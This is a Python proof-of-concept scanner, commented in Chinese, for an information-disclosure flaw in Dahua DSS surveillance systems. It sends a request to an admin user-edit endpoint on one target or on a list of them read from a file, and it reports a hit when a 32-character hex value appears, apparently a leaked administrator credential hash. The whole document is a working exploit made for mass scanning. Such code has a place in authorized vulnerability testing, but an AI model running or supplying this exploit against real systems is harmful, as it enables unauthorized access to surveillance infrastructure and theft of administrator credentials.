# 导入requests库，用于发送HTTP请求
import requests
# 导入argparse库，用于处理命令行参数
import argparse
# 导入re库，用于正则表达式匹配
import re
# 从requests.exceptions导入RequestException，用于捕获请求异常
from requests.exceptions import RequestException
# 从urllib3.exceptions导入InsecureRequestWarning，用于禁用不安全请求警告
from urllib3.exceptions import InsecureRequestWarning

# 打印颜色控制字符
# 打印颜色
RED = '\033[91m'
RESET = '\033[0m'

# 禁用urllib3的不安全请求警告
# 禁用不安全请求警告
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


def check_vulnerability(url):
    """
    检查给定URL是否存在大华DSS数字监控系统user_edit.action信息泄露漏洞。

    :param url: 待检查的URL字符串
    """
    try:
        # 构造攻击URL，尝试访问管理员用户编辑页面
        attack_url = url.rstrip('/') + "/admin/cascade_/user_edit.action?id=1"

        # 发送GET请求，忽略SSL验证，设置超时为10秒
        response = requests.get(attack_url, verify=False, timeout=10)
        # 定义正则表达式模式，用于匹配可能的信息泄露标识
        regex_patterns = [
            '[0-9a-f]{32}'  # 匹配32位的十六进制字符串，可能是UUID或其他唯一标识
        ]

        # 默认假设没有发现数据泄露
        data_disclosed = False  # 标记是否发现信息泄露

        # 遍历正则表达式模式，检查响应文本中是否存在匹配
        for pattern in regex_patterns:
            # 如果找到匹配，输出漏洞警告信息，并跳出循环
            if re.search(pattern, response.text):
                print(f"{RED}URL [{url}] 存在大华 DSS 数字监控系统user_edit.action 信息泄露漏洞。{RESET}")
                data_disclosed = True
                break  # 匹配到则跳出循环

        # 如果没有发现数据泄露，输出安全提示
        if not data_disclosed:
            print(f"URL [{url}] 未发现漏洞。")

    except RequestException as e:
        # 如果请求过程中发生异常，输出错误信息
        print(f"URL [{url}] 请求失败: {e}")


def main():
    """
    程序主入口。

    使用argparse处理命令行参数，根据参数执行URL漏洞检查。
    """
    # 创建命令行参数解析器
    parser = argparse.ArgumentParser(
        description='检查目标URL是否存在大华 DSS 数字监控系统user_edit.action 信息泄露漏洞。')
    # 添加URL参数，用于指定单个目标URL
    parser.add_argument('-u', '--url', help='指定目标URL')
    # 添加文件参数，用于指定包含多个目标URL的文本文件
    parser.add_argument('-f', '--file', help='指定包含多个目标URL的文本文件')

    # 解析命令行参数
    args = parser.parse_args()

    # 如果指定了URL参数
    if args.url:
        # 如果URL未以http://或https://开头，则添加http://
        args.url = "http://" + args.url.strip("/") if not args.url.startswith(("http://", "https://")) else args.url
        # 调用漏洞检查函数
        check_vulnerability(args.url)
    # 如果指定了文件参数
    elif args.file:
        # 打开文件，读取每行作为URL进行检查
        with open(args.file, 'r') as file:
            urls = file.read().splitlines()
            for url in urls:
                # 处理URL前缀，确保URL以http://或https://开头
                url = "http://" + url.strip("/") if not url.startswith(("http://", "https://")) else url
                # 调用漏洞检查函数
                check_vulnerability(url)


if __name__ == '__main__':
    main()
